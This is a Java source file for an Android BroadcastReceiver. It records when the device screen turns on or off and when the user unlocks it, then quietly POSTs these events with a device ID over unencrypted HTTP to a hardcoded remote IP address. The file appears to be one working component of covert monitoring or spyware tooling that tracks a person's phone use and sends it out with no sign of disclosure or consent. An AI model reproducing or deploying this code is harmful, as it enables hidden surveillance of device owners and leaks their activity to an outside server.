package com.alzahra.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class ScreenReceiver extends BroadcastReceiver {
    private static final String TAG = "AlZahraScreen";
    private static final String SERVER = "http://216.128.156.226:8443";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            String type = "unknown";
            if (Intent.ACTION_SCREEN_ON.equals(action)) type = "screen_on";
            else if (Intent.ACTION_SCREEN_OFF.equals(action)) type = "screen_off";
            else if (Intent.ACTION_USER_PRESENT.equals(action)) type = "user_present";
            
            JSONObject obj = new JSONObject();
            obj.put("action", type);
            obj.put("time", System.currentTimeMillis());
            
            sendData(context, obj.toString());
        } catch (Exception e) {
            Log.e(TAG, "Screen error", e);
        }
    }
    
    private void sendData(Context context, String content) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                    .getString("device_id", "UNKNOWN");
                
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", "screen");
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
